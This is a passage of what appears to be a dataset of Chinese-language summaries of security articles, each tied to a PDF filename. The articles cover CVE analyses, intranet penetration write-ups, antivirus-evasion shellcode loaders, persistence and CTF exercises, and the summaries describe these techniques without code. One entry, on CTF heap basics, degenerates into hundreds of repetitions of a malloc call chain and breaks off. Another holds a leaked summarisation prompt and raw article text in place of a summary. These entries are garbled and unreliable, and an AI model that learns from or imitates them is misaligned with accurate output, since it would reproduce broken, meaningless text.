        "page_content": "该文档介绍了如何对小程序进行渗透测试，包括提取小程序前端源码、查找加解密方法、修改数据包并进行测试。通过对数据包的解密和修改，作者发现了两个高危漏洞，包括任意用户密码修改和SQL注入。",
        "FileName": "8205-记一次小程序加解密测试.pdf"
    },
    {
        "page_content": "CVE-2016-0199 漏洞是一个类型混淆漏洞，影响 Microsoft Internet Explorer 9 至 11，允许远程代码执行或拒绝服务攻击。该漏洞源于 mshtml.dll 组件在将 CElement 对象复制到 Variant 对象时未进行类型校验，导致类型混淆，从而可利用原始值数据作为 vftable 地址，引发访问错误。",
        "FileName": "9351-Internet Explorer漏洞分析(四)——CVE-2016-0199.pdf"
    },
    {
        "page_content": "该文档介绍了 Alaris shellcode 免杀加载器的技术原理，包括绕过 PatchGuard、使用微型筛选器驱动程序、直接调用系统函数、防止第三方 DLL 注入、使用 QueueUserAPC 进行进程注入、使用对称加密算法 AES-CBC 256 加密 shellcode、进程替换技术、欺骗父进程 ID、执行后覆盖自身 shellcode 和隐藏启动窗口。",
        "FileName": "9723-ALaris shellcode免杀loader的技术原理.pdf"
    },
    {
        "page_content": "本文档主要介绍了各种管道符在Linux系统中的用法，包括`|`（按位或）、`||`（逻辑或）、`&`（按位与）、`&&`（逻辑与）、`;`（Linux下与&作用相同）。此外，还介绍了如何利用管道符绕过Web应用程序中的安全限制，例如通过构造payload来读取文件或执行命令。",
        "FileName": "12209-buuctf Web 下.pdf"
    },
    {
        "page_content": "该文档详细描述了一次完整的内网渗透经历，从寻找目标到最终获取域控权限。渗透者利用了各种技术，包括Web服务、socks代理、MS17010漏洞、弱口令攻击和备份文件恢复，最终成功绕过防火墙，添加管理员账户，并获取了域内用户HASH，从而控制了域控。",
        "FileName": "9374-记一次完整的内网渗透经历.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2017-3248 和 CVE-2018-2628 漏洞，这些漏洞利用了 WebLogic 中的 JRMP 反序列化漏洞。攻击者可以通过向 WebLogic 服务器发送精心设计的 payload 来利用这些漏洞，从而在目标系统上执行任意代码。文档提供了利用这些漏洞的详细步骤，包括如何生成 payload、如何使用 T3 协议发送 payload 以及如何利用 DGC 客户端接收响应。",
        "FileName": "10171-weblogic漏洞分析之CVE-2017-3248 & CVE-2018-2628.pdf"
    },
    {
        "page_content": "该文档分析了 Oracle Weblogic 10.3.6.0 版本 Console HTTP 协议远程代码执行漏洞 (CVE-2020-14882)，该漏洞允许攻击者在未经身份验证的情况下执行任意代码并接管 WebLogic Server Console。文档详细介绍了漏洞的触发点和利用链，并提供了利用该漏洞的 POC。",
        "FileName": "8470-Weblogic 10.3.6.0版本 Console HTTP 协议远程代码执行漏洞（CVE-2020-14882）分析以及poc构造.pdf"
    },
    {
        "page_content": "本文分析了开源许可证的类型和差异，包括宽松式许可证和 Copyleft 许可证，并比较了它们的限制、条件和权限。宽松式许可证允许自由使用、修改和重新分发，而 Copyleft 许可证要求在使用开源组件时公开代码。本文还讨论了不同许可证之间的具体差异，例如 Apache 2.0 和 BSD 许可证，以及 GNU GPL 和 Eclipse 开源许可证。",
        "FileName": "12671-开源许可证保姆级入门手册.pdf"
    },
    {
        "page_content": "该文档探讨了使用机器学习技术检测恶意域名，重点关注基于 DGA 算法生成的域名。它介绍了传统检测方法和基于机器学习的检测方法，并详细分析了特征提取和特征选择过程。文档还提供了使用 XGBoost 分类器和堆叠模型融合的实验结果，表明机器学习方法在检测恶意域名方面具有较高的准确性和鲁棒性。",
        "FileName": "10522-机器学习DGA域名检测.pdf"
    },
    {
        "page_content": "该文档详细介绍了各种 Web 应用程序漏洞，包括 SQL 注入、跨站脚本攻击、服务器端请求伪造和任意代码执行，并提供了利用这些漏洞的示例有效载荷。它还强调了验证用户输入、使用安全编码实践和保持软件组件更新的重要性。",
        "FileName": "12103-DSVW通关教程.pdf"
    },
    {
        "page_content": "该文档主要介绍了利用 PHP session 的两种方法：session 文件包含和 session 反序列化。通过设置特定的 PHP.ini 配置，攻击者可以利用 session.upload_progress.name 变量在 session 文件中写入恶意代码，从而实现文件包含。此外，通过设置 session.serialize_handler 为 php，攻击者可以利用 PHP_SESSION_UPLOAD_PROGRESS 变量构造反序列化 payload，从而执行任意代码。",
        "FileName": "10662-session利用的小思路.pdf"
    },
    {
        "page_content": "WordPress 插件 wpdiscuz 存在任意文件上传漏洞，该漏洞允许攻击者通过上传带有 GIF 头的 PHP 文件来执行任意代码。该漏洞源于插件在上传文件时只检查文件头，而没有检查文件后缀，导致攻击者可以绕过文件类型限制，上传恶意 PHP 文件。",
        "FileName": "8276-wordpress插件wpdiscuz任意文件上传漏洞分析.pdf"
    },
    {
        "page_content": "本文记录了一次渗透测试的艰难打点过程，重点关注了突破点和漏洞组合的利用。渗透测试人员通过仔细观察浏览器选项卡的 logo 变化，发现了帆软报表系统的存在，并利用其目录遍历和任意文件读取漏洞获得了加密的账号密码。随后，他们通过解密账号密码进入后台，并利用移动文件权限将 shell 移动到 WebReport 目录下。最后，他们通过列目录漏洞找到计划任务目录，将弹 shell 的脚本替换到现有计划任务中，实现了命令执行。此外，他们还通过 GitHub 源码泄露发现了另一个系统，并通过泄露的邮箱重置了 VPN 密码，成功进入内网。",
        "FileName": "10994-记录一次渗透测试艰难打点的过程.pdf"
    },
    {
        "page_content": "**文档主题：** CTF_pwn_ 堆⼊⻔知识及例题分析\n\n**文档内容：**\n\nCTF_pwn_ 堆⼊⻔知识及例题分析 x1aob1n / 2021-12-17 10:34:34 / 浏览数  5982 堆和栈都是⼀种数据结构，在内存中线性分布储存数据，栈由⾼地址向低地址伸展，堆由低地址向⾼地址伸展。堆的位置⼀般都在 bss 段的⾼地址处。 在程序运⾏过程中，堆可以提供动态分配的内存，允许程序申请⼤⼩未知的内存。堆其实就是程序虚拟地址空间的⼀块连续的线性 区域，它由低地址向⾼地址⽅向增⻓。我们⼀般称管理堆的那部分程序为堆管理器。 ⽬前  Linux  标准发⾏版中使⽤的堆分配器是  glibc  中的堆分配器： ptmalloc2 。 ptmalloc2  主要是通过  malloc/free  函数来分配和释放 内存块。 _libc_malloc --> _int_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_malloc --> __libc_malloc --> _int_",
        "FileName": "10650-CTF_pwn_堆入门知识及例题分析.pdf"
    },
    {
        "page_content": "本文讨论了使用 ptrace 技术时需要注意的细节，包括多线程处理、信号处理、内存映射、断点实现、代码注入和函数调用。它强调了在使用 ptrace 时考虑线程操作、正确处理信号、使用新的 IPC 机制以及避免栈对齐问题的重要性。",
        "FileName": "9815-说一说ptrace不可忽略的技术细节.pdf"
    },
    {
        "page_content": "该文档详细介绍了利用 Apache Tomcat AJP 漏洞（CVE-2020-1938）和 Nexus Repository Manager 3 远程命令执行漏洞（CVE-2020-10199）对三个靶场进行渗透测试的过程，包括漏洞分析、工具使用和 flag 获取，强调了漏洞利用的思路和方法。",
        "FileName": "11973-记一次某春秋靶场宇宙尘埃打靶体验.pdf"
    },
    {
        "page_content": "本文分析了 16 个 BAT XSS 实例，重点介绍了第 4、5、6 题的构造和绕过思路。第 4 题通过模板字符串绕过运算符过滤，第 5 题利用参数控制 script 标签的 src 值，第 6 题则需要绕过问号和百分号过滤，并利用参数校验漏洞构造 XSS 攻击。",
        "FileName": "11681-一些BAT的XSS实例（二）进阶篇.pdf"
    },
    {
        "page_content": "该文档分析了某 CMS 中的多个 SQL 注入漏洞，包括后台和前台的漏洞。后台漏洞出现在 de***.php 和 lo***.php 文件中，前台漏洞出现在 me***.php 文件中。攻击者可以通过构造恶意 SQL 查询来利用这些漏洞，从而获取敏感信息或控制系统。文档还提供了相应的 tamper 脚本，以帮助攻击者绕过 CMS 的安全措施。",
        "FileName": "7302-某CMS的多处SQL注入审计分析.pdf"
    },
    {
        "page_content": "本文档分析了 House of orange 攻击技术，该技术利用堆溢出和 IO 流组合攻击来释放 unsortedbin 中的 chunk，并结合 unsortedbin attack 和 FSOP 攻击 _IO_FILE_plus.vtable。该技术是 IO 利用的早期方法，开启了堆与 IO 组合利用的先河。",
        "FileName": "12902-House of orange及其IO组合攻击学习利用.pdf"
    },
    {
        "page_content": "该文档介绍了多种正向 shell 技术，包括利用 WinRM 和 HTTP.sys 端口复用、使用 Invoke-Command 和 evil-winrm 脚本、利用 iptables 进行端口复用、利用 TCP 协议作为开关、使用 msf 正向 shell、利用 netsh 进行端口代理、使用冰蝎正向后门代理流量以及利用蚁剑反弹 shell。",
        "FileName": "10843-正向shell相关技术总结.pdf"
    },
    {
        "page_content": "本文档重点介绍了提高邮件可信度的设置方法，包括身份可信和内容可信两个方面。身份可信涉及 IP 地区、域名相似性、SPF/DKIM/DMARC/PTR 身份认证等，而内容可信则涉及发件人名称、邮件内容和附件等。通过遵循本文档中的步骤，可以有效提升邮件可信度，避免被标记为垃圾邮件或被拒收。",
        "FileName": "11980-邮件可信其一邮件身份可信.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2016-0638 漏洞，该漏洞是基于 CVE-2015-4852 漏洞的绕过。通过分析补丁和利用工具，文档揭示了绕过补丁的原理，即利用 weblogic.jms.common.StreamMessageImpl#readExternal() 方法，该方法可以接收序列化数据并反序列化该数据，从而绕过黑名单检查。",
        "FileName": "8701-Java安全之Weblogic 2016-0638分析.pdf"
    },
    {
        "page_content": "该文档分析了 Confluence 中的两个漏洞：CVE-2019-3396 和 CVE-2021-26084。CVE-2019-3396 允许通过模板注入执行任意代码，而 CVE-2021-26084 允许通过 OGNL 表达式注入执行任意代码。文档详细介绍了漏洞的利用过程，包括补丁和缓解措施。",
        "FileName": "10736-Confluence CVE-2019-3396 & CVE-2021-26084漏洞分析.pdf"
    },
    {
        "page_content": "这篇文档探讨了如何分析 macOS 应用程序，包括代码签名、强化运行时和授权的概述。此外，还介绍了各种文件和内存分析技术和工具，例如 codesign、jtool、otool、nm、strings、Ghidra、Frida 和 lldb。",
        "FileName": "12803-深入探讨 MacOS 应用程序的渗透测试第二部分.pdf"
    },
    {
        "page_content": "该文档描述了在 Keybase 聊天客户端中发现的一个一键式远程代码执行 (RCE) 漏洞。该漏洞允许攻击者通过发送一个经过特殊编码的链接来在受害者的系统上执行任意命令。该漏洞利用了 Keybase 客户端处理聊天消息中链接的方式，并通过 Lumens 付款请求功能实现了 RCE。Keybase 已修复该漏洞，并建议用户更新到最新版本。",
        "FileName": "7796-Bug BountyKeybase一键式RCE.pdf"
    },
    {
        "page_content": "哈希传递攻击（PTH）是一种通过获取用户 NTLM 哈希值来模拟用户登录或身份验证的攻击方法，攻击者可以利用该哈希值直接远程登录目标主机或反弹 Shell，在域环境中尤其适用。",
        "FileName": "9842-谭谈哈希传递那些世人皆知的事.pdf"
    },
    {
        "page_content": "本文探讨了云函数的多种用途，包括使用云函数作为 HTTP 代理、SOCKS5 代理和反弹 shell。通过利用云函数的 API 网关触发器和对外发包能力，可以实现这些用途，从而扩展云函数的功能并使其适用于各种场景。",
        "FileName": "9502-浅谈云函数的利用面.pdf"
    },
    {
        "page_content": "这篇文档主要分析了哥斯拉 webshell 的流量加解密算法，具体包括请求包和响应包的加密和解密过程。文档首先介绍了哥斯拉 webshell 的生成过程，然后分析了请求包的加密流程，包括数据加密、base64 编码和 url 编码。接着，文档分析了请求包的解密流程，包括 url 解码、base64 解码和 aes 解密。最后，文档分析了响应包的加密流程，包括 aes 加密、base64 编码和 md5 处理，以及响应包的解密流程，包括 md5 处理、base64 解码和 aes 解密。",
        "FileName": "10556-哥斯拉流量加解密浅析（jsp篇）.pdf"
    },
    {
        "page_content": "该文档分析了 MySQL JDBC 中的 XXE 漏洞，该漏洞是由 getSource 方法未对输入的 XML 数据进行验证造成的。攻击者可以构造恶意的 XML 数据来引入外部实体，从而导致 XXE 攻击。受影响的版本为 8.0.27 以下，修复方法是在解析 XML 前添加安全防御措施。",
        "FileName": "10427-MYSQL JDBC XXE漏洞分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何通过分析 Webpack 打包文件来发现泄露的 API。它提供了分步指南，包括安装必要的工具、搜索 .js.map 文件、下载和反编译文件，以及使用 IDE 或其他编辑器搜索接口。该文档还讨论了动态定义的接口，并提供了如何找到它们的说明。",
        "FileName": "9453-发现Webpack中泄露的api.pdf"
    },
    {
        "page_content": "该文档介绍了服务主体名称 (SPN) 在 Kerberos 身份验证中的作用，以及如何识别和利用 SPN 进行 Kerberoasting 攻击。SPN 是服务实例的唯一标识符，用于将服务与服务登录帐户关联。通过查询 SPN，攻击者可以识别运行重要服务的机器，并通过暴力破解来获取域用户帐户的明文密码。文档还提供了应对 Kerberoasting 攻击的措施，例如为域帐户授予读取和写入 SPN 的权限。",
        "FileName": "8406-安全技术  域渗透之SPN.pdf"
    },
    {
        "page_content": "该文档介绍了 IPC$ 共享利用姿势，包括其原理、利用条件、常用命令和利用方式。IPC$ 共享是一种命名管道，允许进程间通信，可以通过验证用户名和密码获得相应的权限，用于远程管理计算机和查看共享资源。利用姿势包括建立空连接、查看文件、盘符映射、查看进程和执行定时任务，但需要注意的是，利用 schtasks 命令会在系统中留下痕迹。",
        "FileName": "11783-IPC$共享利用姿势.pdf"
    },
    {
        "page_content": "该文档详细介绍了作者在绕过国外杀毒软件诺顿和赛门铁克的保护以渗透主机时的经历。作者尝试了多种免杀技术，包括 base64 加密 shellcode、go 语言加密 shellcode 执行、FourEye 免杀和 DNStager 分离免杀，最终成功获取了 shell。",
        "FileName": "9706-记一次Bypass国外杀毒的主机渗透经历.pdf"
    },
    {
        "page_content": "文档主题是分析如下文档并完成以下任务：\n                    1. 分析文档的主题和内容\n                    2. 用一段话概括文档\n文档内容是：\n                    1.登录 安卓安全学习笔记之 2022ByteCTF mobile 复现 安卓安全学习笔记之 2022ByteCTF mobile 复现 eeeeeeeeeeeeeeee   /  2023-02-10 10:04:00  /  发表于⼭东  /  浏览数  3406 现在很多 App 中都会内置 html5 界⾯，有时候会涉及到与 android 进⾏交互，这就需要⽤到 WebView 控件， WebView 可以做到： 1. 显示和渲染 web 界⾯ 2. 直接使⽤ html 进⾏布局 3. 与 js 进⾏交互 创建 WebView 拥有两种⽅法，第⼀种⽅法是 WebView webview = new WebView(getApplicationContext()); 创建；第⼆种是在 xml ⽂ 件内放在布局中；下⾯以第⼆种⽅法为例 Activity_main.xml ⽂件 < WebView \t\t\t\t\t\t\t\t android : id = \"@+id/eeeewebview\" \t\t\t\t\t\t\t\t android : layout_width = \"0dp\" \t\t\t\t\t\t\t\t android : layout_height = \"0dp\" \t\t\t\t\t\t\t\t app : layout_constraintBottom_toBottomOf = \"parent\" \t\t\t\t\t\t\t\t app : layout_constraintEnd_toEndOf = \"parent\" \t\t\t\t\t\t\t\t app : layout_constraintStart_toStartOf = \"parent\" \t\t\t\t\t\t\t\t app : layout_constraintTop_toTopOf = \"parent\" \t /> MainActivity.java ⽂件 public \t void \t onCreate ( Bundle \t savedInstanceState ) \t { \t\t\t\t\t\t\t\t super . onCreate ( savedInstanceState ); \t\t\t\t\t\t\t\t setContentView ( R . layout . activity_main ); \t\t\t\t\t\t\t\t //\tWebView \t\t\t\t\t\t\t\t WebView \t webView\n2.super . onCreate ( savedInstanceState ); \t\t\t\t\t\t\t\t setContentView ( R . layout . activity_main ); \t\t\t\t\t\t\t\t //\tWebView \t\t\t\t\t\t\t\t WebView \t webView \t = \t ( WebView ) \t findViewById ( R . id . eeeewebview ); \t\t\t\t\t\t\t\t webView . loadUrl ( \"https://www.baidu.com\" ); \t\t\t\t\t\t\t\t webView . setWebViewClient ( new \t WebViewClient (){ \t\t\t\t\t\t\t\t\t\t\t\t @Override \t\t\t\t\t\t\t\t\t\t\t\t public \t boolean \t shouldOverrideUrlLoading ( WebView \t view , \t String \t url ) \t { \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t // 使⽤ WebView 加载显示 url \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t view . loadUrl ( url ); \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t // 返回 true \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t return \t true ; \t\t\t\t\t\t\t\t\t\t\t\t } \t\t\t\t\t\t\t\t }); 写完之后运⾏，发现报错，⽆法打开⽹⻚ (net::ERR_CLEARTEXT_NOT_PERMITTED) ，   经过搜索在 manifest 内设置 usesCleartextTraffic 为 true 即可 ⼀：前置知识 1.WebView可以看到百度已经被打开了，啊～因为这个 app 是我⽤来测试其他东⻄的，所以会看到三个奇奇怪怪的按钮 Uri 代表要操作的数据， Android 上可⽤的每种资源  ( 图像、视频⽚段、⽹⻚等 )  都可以⽤ Uri 来表示。从概念上来讲， UrI 包括 URL 。 Uri 的基本结构是 ⼤致为 [scheme:]scheme-specific-part[#fragment] 细分为 [scheme:][//authority][path][?query][#fragment] path 可以存在多个，以 \"/\" 连接",
        "FileName": "12131-安卓安全学习笔记之2022ByteCTF mobile复现.pdf"
    },
    {
        "page_content": "本文分析了 Java 中的服务器端模板注入 (SSTI) 漏洞，重点关注 Velocity 框架。它解释了 SSTI 的原理，并通过一个漏洞示例展示了如何利用 Velocity 中的漏洞来执行任意代码。文章还提供了其他框架中 SSTI 漏洞的简要概述，并提供了进一步研究的资源。",
        "FileName": "7466-白头搔更短，SSTI惹人心！.pdf"
    },
    {
        "page_content": "该文档介绍了利用 Windows 辅助功能（如粘滞键、讲述人、放大镜）在启用了 RDP 并具有管理员权限的主机上实现持久化访问的技术。这些技术涉及修改注册表或替换辅助功能二进制文件，以在执行辅助功能时执行恶意 payload，从而获得提升后的会话或命令提示符。文档还提供了利用 Metasploit、Empire 和 PowerShell 脚本自动化这些技术的模块和脚本。",
        "FileName": "7034-利用windows的辅助功能进行权限维持.pdf"
    },
    {
        "page_content": "该文档介绍了四种绕过逻辑漏洞修改他人密码的方法，包括修改标志位、修改验证码发送手机号、删除验证码和验证码爆破。这些漏洞的形成原因主要是后端验证不严格，导致攻击者可以轻易修改标志位、发送验证码到其他手机号、删除验证码或爆破验证码。",
        "FileName": "7623-一篇文章教你如何找出找回密码漏洞。（新手推荐）.pdf"
    },
    {
        "page_content": "该文档描述了 PostgreSQL JDBC 驱动程序中的一个任意代码执行漏洞 (CVE-2022-21724)，该漏洞允许攻击者通过控制 JDBC URL 或属性来执行任意代码，影响范围为 PgJDBC 9.4.1208 至 42.2.25 以及 42.3.0 至 42.3.2。",
        "FileName": "11812-PostgresQL JDBC Drive 任意代码执行漏洞(CVE-2022-21724).pdf"
    },
    {
        "page_content": "该文档分析了利用 Shiro 注射回显内存马攻击 Tomcat 的两种方法，一种是基于全局存储的新思路，另一种是通过自定义 ClassLoader 加载 Body 数据。文档详细介绍了攻击流程和 POC 代码，并提供了绕过 Header 长度限制的技巧。",
        "FileName": "12537-Shiro注入回显内存马.pdf"
    },
    {
        "page_content": "本文档介绍了如何对 ThinkPHP（TP）二次开发的源码进行审计，重点关注了 TP3.2.3 版本中的漏洞。作者通过分析代码，发现了任意文件包含代码执行、SQL注入和会话操控等漏洞，并提供了相应的代码示例和修复建议。此外，作者还提到了在 TP3.2.3 中直接调用 Display 方法可能导致任意代码执行的潜在风险。",
        "FileName": "9440-记一次对Tp二开的源码审计（Php审计）.pdf"
    },
    {
        "page_content": "WordPress 的 WP Ultimate CSV Importer 插件存在远程代码执行漏洞 (CVE-2023-4142)，影响所有用户版本 (<=7.9.8) 和管理员其他版本。该漏洞源于 ImportHelpers.php 中的 get_header_values 函数，当插件检测到特定字符串时，会替换 CSV 文件，从而加载恶意 CSV 文件并触发有效负载。官方修复仅禁用了作者权限，但管理员仍然可以上传解析的 CSV 文件，因此漏洞尚未完全修复。",
        "FileName": "12771-WP Ultimate CSV Importer远程代码执行分析-CVE-2023-4142.pdf"
    },
    {
        "page_content": "**主题：** CSRF（跨站请求伪造）攻击概述及其防范措施。\n\n**内容：** CSRF攻击是一种“一键式”攻击，攻击者通过伪造请求欺骗用户点击，从而利用用户的权限执行恶意操作。判断网站是否存在CSRF漏洞的关键在于其对敏感操作的校验是否容易被伪造。防范措施包括增加安全令牌、验证码和安全逻辑流程。",
        "FileName": "11998-Pikachu靶场-CSRF.pdf"
    },
    {
        "page_content": "本指南详细介绍了如何使用 Postern 代理软件和 Charles HTTP 抓包工具，通过将流量转发到 Burp 来对 Android 应用程序进行渗透测试。通过配置 Charles 作为系统网络访问服务器，并安装 Postern 作为全局代理，用户可以轻松捕获所有 HTTP 和 HTTPS 数据包，从而方便地监控应用程序的网络通信。",
        "FileName": "11817-安卓APP抓包解决方案(教程).pdf"
    },
    {
        "page_content": "MongoDB 是一种 NoSQL 数据库，它使用非关系型的数据存储，与传统的关系型数据库不同，MongoDB 允许存储文档形式的数据，文档可以包含键值对、数组和文档数组，MongoDB 中的基本概念包括文档、集合和数据库，MongoDB 具有插入、更新、查询和删除文档等基本语法，MongoDB 还支持 NoSQL 注入，攻击者可以通过构造恶意查询条件绕过身份验证或访问未授权的数据。",
        "FileName": "9908-Nosql 注入从零到一.pdf"
    },
    {
        "page_content": "该文档分析了通达 OA 任意用户登录漏洞，介绍了漏洞的准备、部署、补丁对比、代码分析和修复建议。通过对比更新前后的 webroot 文件，分析更新补丁中相关逻辑代码，发现漏洞利用关键参数 UID，并构造 POST 请求获取登录 cookie，从而实现任意用户登录。修复建议包括移除 logincheck_code.php 文件或使用安全产品禁止其访问，以及更新官方补丁。",
        "FileName": "7952-通达OA任意用户登陆分析.pdf"
    },
    {
        "page_content": "该文档分析了两个影响 Jackson-databind 库的远程代码执行 (RCE) 漏洞，这些漏洞允许攻击者通过启用 enableDefaultTyping() 并使用第三方依赖项 com.nqadmin.rowset.JdbcRowSetImpl 或 org.arrah.framework.rdbms.UpdatableJdbcRowsetImpl 来执行任意命令。这些漏洞可以通过将 Jackson-databind 升级到安全版本或升级到更高版本的 JDK 来修复。",
        "FileName": "8290-CVE-2020-xxxxJackson-databind RCE两则.pdf"
    },
    {
        "page_content": "本文档分析了 LLVM PASS PWN 题目的第三篇，该题目要求利用 LLVM PASS PWN 漏洞执行任意代码。通过逆向分析，发现漏洞点在于负数溢出导致 score 被修改为一个指向特别大地址的地址，从而可以控制 cmd 参数，最终执行 system(\"sh\")。",
        "FileName": "11775-LLVM PASS PWN (三).pdf"
    },
    {
        "page_content": "该文档记录了一次网络安全行动中的渗透过程，通过利用用户名遍历、验证码前端返回、任意用户名修改、管理员后台任意文件上传和MS17010漏洞，攻击者成功获取了系统权限，为后续的内网漫游做好了铺垫。",
        "FileName": "8566-记一次HW打点.pdf"
    },
    {
        "page_content": "本文探讨了 Proguard 混淆对抗技术，重点介绍了 Richard Baumann 2017 年提出的基于 SimHash 算法的自动化反混淆方法。该方法通过将被混淆的 Android 应用程序 (Apk) 与未混淆的 Apk 进行相似性比较，识别出被混淆的代码并将其还原为未混淆的版本。文章还分析了该方法的局限性，并介绍了作者开发的一个辅助逆向工程的开源项目，该项目通过分析成员关系和数据流来帮助识别有价值的代码。",
        "FileName": "11488-Android Proguard混淆对抗之我见.pdf"
    },
    {
        "page_content": "本文深入分析了 Linux 系统下 Redis 的攻击面，涵盖了信息泄露、写 Webshell、写入计划任务反弹 shell、主从复制 RCE、SSRF 对 Redis 的利用、Redis 触发反序列化等攻击方式，并提供了相应的利用方法和原理说明。",
        "FileName": "7974-浅析Linux下Redis的攻击面(一).pdf"
    },
    {
        "page_content": "ManageEngine ADSelfService Plus 历史漏洞 CVE-2021-40539 存在身份认证绕过漏洞，可导致任意远程代码执行（RCE），已在野利用。该漏洞利用了认证校验逻辑的缺陷，攻击者可通过在请求中添加 /./ 绕过认证，并通过任意文件上传漏洞上传恶意 class 文件，再利用 RCE 漏洞触发该文件中的静态方法执行命令。",
        "FileName": "11589-ManageEngine ADSelfService Plus 历史漏洞CVE-2021-40539分析.pdf"
    },
    {
